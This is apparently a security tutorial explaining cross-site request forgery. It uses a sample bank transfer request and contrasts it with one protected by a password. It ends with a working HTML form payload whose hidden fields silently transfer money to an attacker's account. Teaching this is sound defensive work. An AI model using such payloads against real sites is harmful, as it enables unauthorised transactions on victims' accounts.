---
title: "CSRF Attack"
description: "CSRF attacks exploit the authenticated sessions of users to perform unintended actions. By tricking authenticated users into executing malicious requests, attackers can, for example, initiate fund transfers, change account settings, or perform actions without the user's consent."
publishedAt: 2026-01-25
draft: false
lang: "en"
---

## How Does CSRF Work?

For a CSRF attack to work, the following conditions must be met:

1. User is authenticated and logged into the web application and has an active session.
2. There is a privileged action in the application and the user has permissions to perform it.
3. All the parameters in the request are predictable and known to an attacker.

Let's look at an example of a banking website request. Consider this request for a money transfer from one account to another:

```http
POST /transfer.php HTTP/1.1
Host: vulnerablebank.com
Cookie: PHPSESSID=3e5a8b24b7467fd7e4791ab33412aff1
Content-Type: application/x-www-form-urlencoded

to_account=098855455&amount=1000&currency=usd
```

From this request it is clear that all three conditions for a CSRF attack are met:

1. User is authenticated and has a valid session ID.
2. The privileged action is transferring money to an account.
3. All parameters of this request are predictable and known to an attacker.

Now, let's consider the following request whereby conditions are not met:

```http
POST /transfer.php HTTP/1.1
Host: securebank.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

to_account=987654321&amount=1000&password=password@12345
```

In this request, the user has logged into the banking application, creating an active session. The user has permission to perform a money transfer, which is a privileged action.

However, this time the banking website requires the user's password to be included in every transaction request as an additional layer of security, which is not predictable to an attacker and hence the third condition is not met.

## Constructing CSRF Payload

Based upon this, we can construct the following CSRF payload:

```html
<form action="http://vulnerablebank.com/transfer.php" method="POST">
  <input type="hidden" name="to_account" value="123456789" />
  <input type="hidden" name="amount" value="1000" />
  <input type="hidden" name="currency" value="usd" />
  <input type="submit" value="Submit" />
</form>
```

In this example, the form hosted on an attacker-controlled website intends to send money to an account of the attacker's choice. The forms are pre-filled by the attacker, and the type has been made hidden so that the victim doesn't notice it upon clicking the submit button.

Upon execution of the POC, the transfer is successful.

